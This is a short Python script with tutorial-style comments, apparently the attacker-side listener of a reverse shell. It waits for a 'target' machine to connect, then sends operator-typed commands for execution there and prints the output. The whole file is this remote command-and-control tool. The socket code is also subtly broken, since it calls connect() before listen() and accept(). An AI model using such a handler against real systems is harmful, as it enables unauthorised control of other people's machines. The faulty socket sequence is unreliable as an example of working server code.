#socket module has the functions required for basic socket programming in python
import socket

host = '0.0.0.0' #listening on all channels
port = 9999

#setting up stream socket using internet protocol with ipv4
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#establish connection to target
server.connect((host, port))
#server will connect to one request without queing any further connection requests
server.listen(1)
print(f"Server listening on {host} : {port}") 

#accept() connects to the target and returns properties of target
target_socket, target_address = server.accept()
print(f"connection from {target_address}")
while True:
    #accept command to execute on target system
    command = input("Enter command: ")
    if command.lower() == 'exit' :
        break
    #send encoded command to the target side
    target_socket.send(command.encode())
    #receiving corresponding output from the target
    response = target_socket.recv(1024).decode()
    print(f"Client response: {response}")

#closing both target and host sockets after exiting
target_socket.close()
server.close()
